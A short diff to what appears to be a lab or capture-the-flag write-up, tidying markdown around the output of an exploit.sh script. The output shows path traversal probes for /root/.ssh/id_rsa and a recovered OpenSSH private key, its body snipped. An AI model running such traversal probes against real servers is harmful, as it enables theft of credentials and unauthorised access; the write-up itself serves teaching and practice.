@@ -213,8 +213,6 @@ for ((i=0; i<15; i++)); do
 done
 
 [★]$ ./exploit.sh
-```
-```
 [+] Testing with /assets/../root/.ssh/id_rsa
 	Status code --> 404
 [+] Testing with /assets/../../root/.ssh/id_rsa
@@ -226,6 +224,9 @@ done
 <SNIP>
 
 -----END OPENSSH PRIVATE KEY-----
+
+
+
 
 [★]$ vi  id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
